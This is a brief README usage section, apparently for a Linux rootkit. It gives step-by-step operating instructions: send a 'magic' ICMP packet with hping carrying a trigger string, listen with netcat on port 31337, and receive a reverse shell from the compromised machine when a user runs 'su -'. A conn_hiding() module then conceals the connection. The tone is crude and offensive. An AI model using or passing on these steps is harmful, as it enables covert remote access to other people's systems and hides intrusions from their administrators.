- just run ./install.sh


usage
-----

- send magic icmp packet: hping 192.168.2.56 -c 1 -1 -C 8 -e "opensesame" -d 133
- open "nc -lvvp 31337" on your machine
- wait for "su -" call by any bitches on the owned box and you will get reverse
  connect. after that you want to hide your connection, so you should call
  "su -", too, to make a syscall to our conn_hiding() module. yeah i know,
  dirty, but it runs. ;)
